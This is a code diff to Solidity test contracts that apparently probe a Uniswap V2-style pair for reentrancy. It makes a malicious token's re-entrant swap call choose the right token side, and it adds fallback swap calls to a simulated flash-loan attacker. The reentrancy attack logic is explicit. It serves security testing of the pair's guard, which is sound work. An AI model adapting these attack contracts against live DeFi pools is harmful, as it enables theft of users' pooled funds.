@@ -22,6 +22,7 @@ contract MaliciousToken {
     bool public attackEnabled = false;
     uint256 public attackCount = 0;
     uint256 public maxAttacks = 3;
+    bool public isToken0;
 
     constructor() {
         balanceOf[msg.sender] = totalSupply;
@@ -33,6 +34,7 @@ contract MaliciousToken {
      */
     function setPair(address _pair) external {
         pair = _pair;
+        isToken0 = UniswapV2Pair(_pair).token0() == address(this);
     }
 
     /**
@@ -68,12 +70,22 @@ contract MaliciousToken {
             console.log("Launching reentrancy attack, attempt:", attackCount);
 
             // 尝试重入 swap 函数
-            try UniswapV2Pair(pair).swap(0, 100 ether, address(this), "") {
-                console.log("Reentrancy attack succeeded");
-            } catch Error(string memory reason) {
-                console.log("Reentrancy attack failed:", reason);
-            } catch {
-                console.log("Reentrancy attack failed with unknown error");
+            if (isToken0) {
+                try UniswapV2Pair(pair).swap(100 ether, 0, address(this), "") {
+                    console.log("Reentrancy attack succeeded");
+                } catch Error(string memory reason) {
+                    console.log("Reentrancy attack failed:", reason);
+                } catch {
+                    console.log("Reentrancy attack failed with unknown error");
+                }
+            } else {
+                try UniswapV2Pair(pair).swap(0, 100 ether, address(this), "") {
+                    console.log("Reentrancy attack succeeded");
+                } catch Error(string memory reason) {
+                    console.log("Reentrancy attack failed:", reason);
+                } catch {
+                    console.log("Reentrancy attack failed with unknown error");
+                }
             }
         }
 
@@ -145,7 +157,11 @@ contract FlashLoanAttacker {
         attacking = true;
 
         // 模拟闪电贷：借出大量代币
-        target.swap(500 ether, 0, address(this), "");
+        try target.swap(500 ether, 0, address(this), "") {
+            return;
+        } catch {
+            target.swap(0, 500 ether, address(this), "");
+        }
     }
 
     /**
@@ -155,7 +171,11 @@ contract FlashLoanAttacker {
         if (attacking) {
             attacking = false;
             // 尝试再次调用 swap
-            target.swap(100 ether, 0, address(this), "");
+            try target.swap(100 ether, 0, address(this), "") {
+                return;
+            } catch {
+                target.swap(0, 100 ether, address(this), "");
+            }
         }
     }
 
